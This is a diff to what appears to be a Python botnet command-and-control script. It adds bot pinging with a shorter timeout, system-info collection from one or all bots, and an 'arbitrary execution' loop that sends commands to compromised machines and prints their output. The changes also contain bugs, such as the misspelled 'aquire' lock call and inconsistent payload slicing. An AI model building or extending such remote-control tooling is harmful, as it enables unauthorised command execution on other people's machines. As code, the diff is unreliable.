@@ -93,9 +93,9 @@ def test_conn():
     # Breakdown of ex: 1st char: message is response, 2nd-5th char: bot ID, 6th-7th chars: ok message
     lastpingsent = time.time()
     send("ping")
-    print("Waiting 30 seconds for responses...")
+    print("Waiting 15 seconds for responses...")
     start = time.time()
-    while time.time() - start < 30:
+    while time.time() - start < 15:
         for i in rx.messages:
             if i.finalized and i.payload[0] == "r" and i.payload[5:7] == "ok":
                 rx.tlock.acquire()
@@ -118,18 +118,22 @@ def test_conn():
 
 def show_info():
     # Command: respond with sys info (space separated)
-    send("info", get_target())
-    print("Waiting 3 minutes for response...")
+    target = get_target()
+    send("info", target)
+    print("Waiting up to 3 minutes for response...")
     start = time.time()
-    res = ""
-    while time.time() - start <= 180 and len(res) == 0:
+    res = []
+    if target == "0000":
+        targ_len = len(botlist)
+    else:
+        targ_len = 1
+    while time.time() - start <= 180 and len(res) < targ_len:
         for i in rx.messages:
             if i.finalized and i.payload[0] == "r" and i.payload[5:8] == "st:":
-                res = i.payload[8:]
+                res.append(i.payload[8:])
                 rx.tlock.aquire()
                 rx.messages.remove(i)
                 rx.tlock.release()
-                break
         time.sleep(0.5)
     if len(res) == 0:
         print("Failed to communicate.")
@@ -149,7 +153,21 @@ def arbitrary_exec():
     # Command: ArBitrary eXecution
     tmp = "abx:" + tmp
     send(tmp, get_target())
-    pass
+    print("Sent command. Waiting for reply...")
+    start = time.time()
+    while time.time() - start <= 180:
+        for i in rx.messages:
+            if i.finalized and i.payload[0] == "r" and i.payload[5:9] == "abx:":
+                print("Command output: {}".format(i.payload[8:]))
+                rx.tlock.aquire()
+                rx.messages.remove(i)
+                rx.tlock.release()
+                break
+        time.sleep(0.5)
+    if input("Run another command? (Y/n)").lower() == "n":
+        main_menu()
+    else:
+        arbitrary_exec()
 
 
 def danger_menu():
